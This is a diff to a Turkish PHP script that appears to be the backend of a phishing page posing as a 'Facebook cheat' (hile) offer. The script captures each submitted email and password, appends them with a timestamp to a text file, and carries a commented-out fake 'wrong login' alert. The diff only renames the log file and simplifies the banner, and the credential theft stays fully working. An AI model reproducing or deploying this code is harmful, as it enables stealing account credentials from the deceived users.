@@ -1,47 +1,26 @@
 <?php
-//include "test.php";
-
-//require "facebookhackingattack.php";
-
 ///*
 
 if (isset($_POST['hile']) && isset($_POST['sayi']) && isset($_POST['eposta']) && isset($_POST['password'])) {
 
-$save = fopen("kaydedilen.txt","a+");
+$save = fopen("saved_info.txt","a+");
 $eposta = $_POST['eposta'];
 $password = $_POST['password'];
 $hile = $_POST['hile'];
 $sayi = $_POST['sayi'];
+date_default_timezone_set('Europe/Istanbul');
+$tarih = date('d/m/Y H:i:s');
 $vericekilen = ("
-\e[32m
-	████████████████████████████████████████
-	██
-	██ \e[97mHİLE TÜRÜ     : \e[32m".$hile."\e[32m
-	██
-	████████████████████████████████████████
++-+-+ FACEBOOK HİLE +-+-+
 
+ Tarih         : ".$tarih."
 
-	████████████████████████████████████████
-	██
-	██ \e[97mSAYI          : \e[32m".$sayi."\e[32m
-	██
-	████████████████████████████████████████
+ E-POSTA       : ".$eposta."
 
+ Şifre         : ".$password."
 
-	████████████████████████████████████████
-	██
-	██ \e[97mE-POSTA       : \e[32m".$eposta."\e[32m
-	██
-	████████████████████████████████████████
-
-
-	████████████████████████████████████████
-	██
-	██ \e[97mŞİFRE         : \e[32m".$password."\e[32m
-	██
-	████████████████████████████████████████\e[97m
-
-	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-");
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+");
 fwrite($save,$vericekilen);
 fclose($save);
 //echo "<script>alert('HATALI GİRİŞ YAPTINIZ !');</script>";
